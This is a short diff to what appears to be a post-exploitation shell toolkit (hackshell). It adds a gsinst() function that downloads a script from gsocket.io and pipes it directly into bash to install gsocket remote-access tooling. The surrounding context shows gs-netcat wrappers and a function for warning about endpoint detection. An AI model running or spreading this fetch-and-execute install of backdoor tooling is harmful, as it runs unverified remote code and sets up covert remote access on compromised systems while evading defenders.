@@ -933,6 +933,12 @@ gsnc() {
 }
 command -v gs-netcat >/dev/null || gs-netcat() { gsnc "$@"; }
 
+gsinst() {
+    local b
+    [ -n "$BRANCH" ] && b="${BRANCH}/"
+    dl https://gsocket.io/${b}y | bash
+}
+
 # https://github.com/hackerschoice/hackshell/issues/6
 _warn_edr() {
     local fns s out
